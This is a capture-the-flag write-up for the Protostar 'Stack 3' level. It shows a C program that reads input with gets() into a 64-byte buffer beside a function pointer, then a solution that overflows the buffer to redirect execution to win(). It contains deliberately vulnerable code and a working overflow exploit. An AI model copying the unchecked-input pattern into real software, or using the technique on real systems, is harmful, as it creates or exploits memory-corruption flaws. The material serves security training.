# Stack 3

## Source Code
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
## Solution
```
user@protostar:/opt/protostar/bin$ objdump -t stack3 | grep win
08048424 g     F .text  00000014              win
user@protostar:/opt/protostar/bin$ python -c "print(('A'*64)+'\x24\x84\x04\x08')" | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```